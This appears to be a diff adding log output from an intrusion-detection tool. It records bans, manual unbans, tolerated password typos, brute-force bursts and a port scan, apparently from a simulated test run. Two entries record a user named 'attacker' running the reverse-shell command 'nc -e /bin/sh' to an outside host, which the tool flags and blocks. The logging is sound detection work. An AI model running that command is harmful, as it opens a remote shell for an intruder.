+  Details: Network: [INTERNAL] | Target: 192.168.1.177 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 15:48:25] [INFO    ] [SAFE OPERATION] [AUTH_GUARD] [HUMAN_TYPO_TOLERATED]
+  Target: 192.168.1.177 | MITRE: N/A | AI Verdict: N/A
+  Summary: Human password typo tolerated for target 192.168.1.177. (Safe Operation - No ban applied).
+  Details: Tolerated human password typo (1/8) for user 'admin' from 192.168.1.177. No ban applied.
+---------------------------------------------------------------------------
+[2026-08-19 15:48:47] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.201 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.201 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.201 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 15:48:47] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGIN]
+  Target: 192.168.1.201 | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'attacker' logged in successfully. (IP: 192.168.1.201 | Terminal: pts/2)
+  Details: User 'attacker' logged in successfully. (IP: 192.168.1.201 | Terminal: pts/2)
+---------------------------------------------------------------------------
+[2026-08-19 15:48:47] [CRITICAL] [MALICIOUS ATTACK] [USER_ACTIVITY] [COMMAND_REVERSE_SHELL_ATTEMPT]
+  Target: 192.168.1.201 | MITRE: T1071 | AI Verdict: ATTACK
+  Summary: AI [ATTACK] (100.0% Confidence) | Command & Control (C2) / Reverse Shell (MITRE T1071 - NETWORK_C2) detected from 192.168.1.201.
+  Details: Session [SESS_attacker_192.168.1.201_pts_2_1787143727475]: User 'attacker' executed 'nc -e /bin/sh 10.0.0.9 4444'. (Summary: Outbound Reverse Shell Connection Attempt)
+---------------------------------------------------------------------------
+[2026-08-19 15:48:47] [CRITICAL] [MALICIOUS OPERATION] [BAN_MANAGER] [INTERNAL_IP_BAN]
+  Target: 192.168.1.201 | MITRE: N/A | AI Verdict: N/A
+  Summary: INTERNAL LAN IP 192.168.1.201 SSH isolated due to security violations.
+  Details: Target 192.168.1.201 (INTERNAL) restricted for 30 mins. Reason: Session Hostile Activity: 'nc -e /bin/sh 10.0.0.9 4444' (CRITICAL Level - Risk: 85)
+---------------------------------------------------------------------------
+[2026-08-19 15:48:47] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.201 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.201 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.201 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 15:48:47] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.155 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.155 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.155 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 15:48:47] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGIN]
+  Target: 192.168.1.155 | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'ubuntu' logged in successfully. (IP: 192.168.1.155 | Terminal: pts/1)
+  Details: User 'ubuntu' logged in successfully. (IP: 192.168.1.155 | Terminal: pts/1)
+---------------------------------------------------------------------------
+[2026-08-19 15:48:47] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGIN]
+  Target: 192.168.1.155 | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'root' logged in successfully. (IP: 192.168.1.155 | Terminal: pts/1)
+  Details: User 'root' logged in successfully. (IP: 192.168.1.155 | Terminal: pts/1)
+---------------------------------------------------------------------------
+[2026-08-19 15:48:47] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.177 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.177 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.177 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 15:48:48] [INFO    ] [SAFE OPERATION] [AUTH_GUARD] [HUMAN_TYPO_TOLERATED]
+  Target: 192.168.1.177 | MITRE: N/A | AI Verdict: N/A
+  Summary: Human password typo tolerated for target 192.168.1.177. (Safe Operation - No ban applied).
+  Details: Tolerated human password typo (1/8) for user 'admin' from 192.168.1.177. No ban applied.
+---------------------------------------------------------------------------
+[2026-08-19 15:48:48] [INFO    ] [SAFE OPERATION] [AUTH_GUARD] [HUMAN_TYPO_TOLERATED]
+  Target: 192.168.1.177 | MITRE: N/A | AI Verdict: N/A
+  Summary: Human password typo tolerated for target 192.168.1.177. (Safe Operation - No ban applied).
+  Details: Tolerated human password typo (2/8) for user 'admin' from 192.168.1.177. No ban applied.
+---------------------------------------------------------------------------
+[2026-08-19 15:48:48] [INFO    ] [SAFE OPERATION] [AUTH_GUARD] [HUMAN_TYPO_TOLERATED]
+  Target: 192.168.1.177 | MITRE: N/A | AI Verdict: N/A
+  Summary: Human password typo tolerated for target 192.168.1.177. (Safe Operation - No ban applied).
+  Details: Tolerated human password typo (3/8) for user 'admin' from 192.168.1.177. No ban applied.
+---------------------------------------------------------------------------
+[2026-08-19 15:48:49] [INFO    ] [SAFE OPERATION] [AUTH_GUARD] [HUMAN_TYPO_TOLERATED]
+  Target: 192.168.1.177 | MITRE: N/A | AI Verdict: N/A
+  Summary: Human password typo tolerated for target 192.168.1.177. (Safe Operation - No ban applied).
+  Details: Tolerated human password typo (4/8) for user 'admin' from 192.168.1.177. No ban applied.
+---------------------------------------------------------------------------
+[2026-08-19 15:48:49] [INFO    ] [SAFE OPERATION] [AUTH_GUARD] [HUMAN_TYPO_TOLERATED]
+  Target: 192.168.1.177 | MITRE: N/A | AI Verdict: N/A
+  Summary: Human password typo tolerated for target 192.168.1.177. (Safe Operation - No ban applied).
+  Details: Tolerated human password typo (5/8) for user 'admin' from 192.168.1.177. No ban applied.
+---------------------------------------------------------------------------
+[2026-08-19 15:48:49] [INFO    ] [SAFE OPERATION] [AUTH_GUARD] [HUMAN_TYPO_TOLERATED]
+  Target: 192.168.1.177 | MITRE: N/A | AI Verdict: N/A
+  Summary: Human password typo tolerated for target 192.168.1.177. (Safe Operation - No ban applied).
+  Details: Tolerated human password typo (6/8) for user 'admin' from 192.168.1.177. No ban applied.
+---------------------------------------------------------------------------
+[2026-08-19 15:48:50] [INFO    ] [SAFE OPERATION] [AUTH_GUARD] [HUMAN_TYPO_TOLERATED]
+  Target: 192.168.1.177 | MITRE: N/A | AI Verdict: N/A
+  Summary: Human password typo tolerated for target 192.168.1.177. (Safe Operation - No ban applied).
+  Details: Tolerated human password typo (7/8) for user 'admin' from 192.168.1.177. No ban applied.
+---------------------------------------------------------------------------
+[2026-08-19 15:48:50] [INFO    ] [SAFE OPERATION] [AUTH_GUARD] [HUMAN_TYPO_TOLERATED]
+  Target: 192.168.1.177 | MITRE: N/A | AI Verdict: N/A
+  Summary: Human password typo tolerated for target 192.168.1.177. (Safe Operation - No ban applied).
+  Details: Tolerated human password typo (8/8) for user 'admin' from 192.168.1.177. No ban applied.
+---------------------------------------------------------------------------
+[2026-08-19 15:48:50] [WARNING ] [MALICIOUS OPERATION] [AUTH_GUARD] [RAPID_BRUTE_FORCE]
+  Target: 192.168.1.177 | MITRE: N/A | AI Verdict: N/A
+  Summary: High-velocity automated brute-force attack burst detected from 192.168.1.177.
+  Details: Rapid Automated Brute-Force Burst Detected from 192.168.1.177 (9 attempts in 3s).
+---------------------------------------------------------------------------
+[2026-08-19 15:48:50] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.177 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.177 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.177 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 15:49:23] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.201 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.201 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.201 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 15:49:23] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGIN]
+  Target: 192.168.1.201 | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'attacker' logged in successfully. (IP: 192.168.1.201 | Terminal: pts/2)
+  Details: User 'attacker' logged in successfully. (IP: 192.168.1.201 | Terminal: pts/2)
+---------------------------------------------------------------------------
+[2026-08-19 15:49:23] [CRITICAL] [MALICIOUS ATTACK] [USER_ACTIVITY] [COMMAND_REVERSE_SHELL_ATTEMPT]
+  Target: 192.168.1.201 | MITRE: T1071 | AI Verdict: ATTACK
+  Summary: AI [ATTACK] (100.0% Confidence) | Command & Control (C2) / Reverse Shell (MITRE T1071 - NETWORK_C2) detected from 192.168.1.201.
+  Details: Session [SESS_attacker_192.168.1.201_pts_2_1787143763312]: User 'attacker' executed 'nc -e /bin/sh 10.0.0.9 4444'. (Summary: Outbound Reverse Shell Connection Attempt)
+---------------------------------------------------------------------------
+[2026-08-19 15:49:23] [CRITICAL] [MALICIOUS OPERATION] [BAN_MANAGER] [INTERNAL_IP_BAN]
+  Target: 192.168.1.201 | MITRE: N/A | AI Verdict: N/A
+  Summary: INTERNAL LAN IP 192.168.1.201 SSH isolated due to security violations.
+  Details: Target 192.168.1.201 (INTERNAL) restricted for 60 mins. Reason: Session Hostile Activity: 'nc -e /bin/sh 10.0.0.9 4444' (CRITICAL Level - Risk: 85)
+---------------------------------------------------------------------------
+[2026-08-19 15:49:23] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.201 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.201 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.201 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 15:49:23] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.155 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.155 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.155 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 15:49:23] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGIN]
+  Target: 192.168.1.155 | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'ubuntu' logged in successfully. (IP: 192.168.1.155 | Terminal: pts/1)
+  Details: User 'ubuntu' logged in successfully. (IP: 192.168.1.155 | Terminal: pts/1)
+---------------------------------------------------------------------------
+[2026-08-19 15:49:23] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGIN]
+  Target: 192.168.1.155 | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'root' logged in successfully. (IP: 192.168.1.155 | Terminal: pts/1)
+  Details: User 'root' logged in successfully. (IP: 192.168.1.155 | Terminal: pts/1)
+---------------------------------------------------------------------------
+[2026-08-19 15:49:23] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.177 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.177 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.177 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 15:49:23] [INFO    ] [SAFE OPERATION] [AUTH_GUARD] [HUMAN_TYPO_TOLERATED]
+  Target: 192.168.1.177 | MITRE: N/A | AI Verdict: N/A
+  Summary: Human password typo tolerated for target 192.168.1.177. (Safe Operation - No ban applied).
+  Details: Tolerated human password typo (1/8) for user 'admin' from 192.168.1.177. No ban applied.
+---------------------------------------------------------------------------
+[2026-08-19 15:49:24] [INFO    ] [SAFE OPERATION] [AUTH_GUARD] [HUMAN_TYPO_TOLERATED]
+  Target: 192.168.1.177 | MITRE: N/A | AI Verdict: N/A
+  Summary: Human password typo tolerated for target 192.168.1.177. (Safe Operation - No ban applied).
+  Details: Tolerated human password typo (2/8) for user 'admin' from 192.168.1.177. No ban applied.
+---------------------------------------------------------------------------
+[2026-08-19 15:49:24] [INFO    ] [SAFE OPERATION] [AUTH_GUARD] [HUMAN_TYPO_TOLERATED]
+  Target: 192.168.1.177 | MITRE: N/A | AI Verdict: N/A
+  Summary: Human password typo tolerated for target 192.168.1.177. (Safe Operation - No ban applied).
+  Details: Tolerated human password typo (3/8) for user 'admin' from 192.168.1.177. No ban applied.
+---------------------------------------------------------------------------
+[2026-08-19 15:49:24] [INFO    ] [SAFE OPERATION] [AUTH_GUARD] [HUMAN_TYPO_TOLERATED]
+  Target: 192.168.1.177 | MITRE: N/A | AI Verdict: N/A
+  Summary: Human password typo tolerated for target 192.168.1.177. (Safe Operation - No ban applied).
+  Details: Tolerated human password typo (4/8) for user 'admin' from 192.168.1.177. No ban applied.
+---------------------------------------------------------------------------
+[2026-08-19 15:49:25] [INFO    ] [SAFE OPERATION] [AUTH_GUARD] [HUMAN_TYPO_TOLERATED]
+  Target: 192.168.1.177 | MITRE: N/A | AI Verdict: N/A
+  Summary: Human password typo tolerated for target 192.168.1.177. (Safe Operation - No ban applied).
+  Details: Tolerated human password typo (5/8) for user 'admin' from 192.168.1.177. No ban applied.
+---------------------------------------------------------------------------
+[2026-08-19 15:49:25] [INFO    ] [SAFE OPERATION] [AUTH_GUARD] [HUMAN_TYPO_TOLERATED]
+  Target: 192.168.1.177 | MITRE: N/A | AI Verdict: N/A
+  Summary: Human password typo tolerated for target 192.168.1.177. (Safe Operation - No ban applied).
+  Details: Tolerated human password typo (6/8) for user 'admin' from 192.168.1.177. No ban applied.
+---------------------------------------------------------------------------
+[2026-08-19 15:49:26] [INFO    ] [SAFE OPERATION] [AUTH_GUARD] [HUMAN_TYPO_TOLERATED]
+  Target: 192.168.1.177 | MITRE: N/A | AI Verdict: N/A
+  Summary: Human password typo tolerated for target 192.168.1.177. (Safe Operation - No ban applied).
+  Details: Tolerated human password typo (7/8) for user 'admin' from 192.168.1.177. No ban applied.
+---------------------------------------------------------------------------
+[2026-08-19 15:49:26] [INFO    ] [SAFE OPERATION] [AUTH_GUARD] [HUMAN_TYPO_TOLERATED]
+  Target: 192.168.1.177 | MITRE: N/A | AI Verdict: N/A
+  Summary: Human password typo tolerated for target 192.168.1.177. (Safe Operation - No ban applied).
+  Details: Tolerated human password typo (8/8) for user 'admin' from 192.168.1.177. No ban applied.
+---------------------------------------------------------------------------
+[2026-08-19 15:49:26] [WARNING ] [MALICIOUS OPERATION] [AUTH_GUARD] [RAPID_BRUTE_FORCE]
+  Target: 192.168.1.177 | MITRE: N/A | AI Verdict: N/A
+  Summary: High-velocity automated brute-force attack burst detected from 192.168.1.177.
+  Details: Rapid Automated Brute-Force Burst Detected from 192.168.1.177 (9 attempts in 3s).
+---------------------------------------------------------------------------
+[2026-08-19 15:49:26] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.177 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.177 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.177 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 15:49:26] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 198.51.100.88 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 198.51.100.88 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 198.51.100.88 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 15:49:26] [CRITICAL] [MALICIOUS OPERATION] [PORT_SCAN_GUARD] [NMAP_PORT_SCAN_INTERCEPT]
+  Target: 198.51.100.88 | MITRE: N/A | AI Verdict: N/A
+  Summary: Automated port sweep scan detected from 198.51.100.88 (5 ports in <3s). 1-Hour kernel ban enforced.
+  Details: Automated port sweep scan detected from 198.51.100.88 (5 ports in <3s). 1-Hour kernel ban enforced.
+---------------------------------------------------------------------------
+[2026-08-19 15:49:26] [CRITICAL] [MALICIOUS OPERATION] [BAN_MANAGER] [INTERNAL_IP_BAN]
+  Target: 198.51.100.88 | MITRE: N/A | AI Verdict: N/A
+  Summary: INTERNAL LAN IP 198.51.100.88 SSH isolated due to security violations.
+  Details: Target 198.51.100.88 (INTERNAL) restricted for 60 mins. Reason: Nmap Port Scan Sweep Detected (5+ distinct ports probed in <3s)
+---------------------------------------------------------------------------
+[2026-08-19 15:49:26] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 198.51.100.88 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 198.51.100.88 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 198.51.100.88 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 15:53:57] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 2001:db8:85a3::8a2e:370:7334 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 2001:db8:85a3::8a2e:370:7334 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 2001:db8:85a3::8a2e:370:7334 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 15:53:57] [CRITICAL] [MALICIOUS OPERATION] [BAN_MANAGER] [INTERNAL_IP_BAN]
+  Target: 2001:db8:85a3::8a2e:370:7334 | MITRE: N/A | AI Verdict: N/A
+  Summary: INTERNAL LAN IP 2001:db8:85a3::8a2e:370:7334 SSH isolated due to security violations.
+  Details: Target 2001:db8:85a3::8a2e:370:7334 (INTERNAL) restricted for 5 mins. Reason: IPv6 Test Ban
+---------------------------------------------------------------------------
+[2026-08-19 15:53:57] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 2001:db8:85a3::8a2e:370:7334 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 2001:db8:85a3::8a2e:370:7334 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 2001:db8:85a3::8a2e:370:7334 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
